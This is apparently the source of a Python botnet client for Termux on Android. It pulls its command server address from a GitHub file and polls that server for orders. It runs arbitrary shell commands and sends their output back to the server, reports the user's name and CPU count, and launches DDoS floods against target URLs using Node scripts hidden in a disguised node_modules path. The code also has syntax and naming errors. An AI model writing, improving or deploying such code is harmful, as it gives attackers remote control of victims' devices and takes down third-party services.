import requests as lol
import time,getpass,subprocess,os
import urllib.parse
while True:
 try:
  endpoint=lol.get("https://raw.githubusercontent.com/dark-zyro/loader/refs/heads/main/endpoint.txt",timeout=2).text
  break
 except:
  time.sleep(5)
lulz="sigma"
def run_background_process(command):
    try:
        process = subprocess.Popen(command,
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL,
                                   shell=True,
                                   start_new_session=True)
        return process
    except Exception as e:
        print(f"Error running background process: {e}")
        return None
def gas(note):
 try:
  user=getpass.getuser()
  corecpu=os.cpu_count()
  output=subprocess.check_output(note, shell=True).decode('utf-8')
  output2=urllib.parse.quote(output)
  lol.get(f"{endpoint}/botnet/api.php?user={user}:core:{core}:{output2}",timeout=5).text
 except:
  print ("oke")
def attack(note):
 try:
  url=note.split("&url=")[1].split("<>")[0]
  rps=note.split("&rps=")[1].split("<>")[0]
  method=note.split("&method=")[1].split("<>")[0]
  time=note.split("&time=")[1].split("<>")[0]
  thread=note.split("&thread=")[1].split("<>")[0]
  if method == "proxy":
   run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/scrape.js")
  elif method == "tls":
   run_background_proccess(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/tls.js {url} {time} {rps} {thread} proxy.txt")
  elif method == "strike":
   run_background_process(f"node /data/data/com.termux/files/home/.session/fingerprint-generator/data_files/node_modules/es6-handler/adapters/cache/StarsXStrike.js GET {url} {time} {thread} {rps} proxy.txt --full")
 except:
  print ("error attack")
def ping():
 try:
  user=getpass.getuser()
  corecpu=os.cpu_count()
  lol.get(f"{endpoint}/botnet/api.php?user={user}:cpu:{corecpu}",timeout=2).text
 except:
  time.sleep(1)
while True:
 try:
  pesan=lol.get(f"{endpoint}/botnet/broadcast.txt",timeout=2).text
  id=pesan.split("@id@")[1].split("$")[0]
  tipe=pesan.split("@tipe@")[1].split("$")[0]
  note=pesan.split("@note@")[1].split("$")[0]
  if id != lulz:
   lulz=id
   if tipe == "ping":
    ping()
   elif tipe == "attack":
    attack(note)
   elif tipe == "exec"
    gas(note)
  else:
   time.sleep(2)
 except:
  time.sleep(2)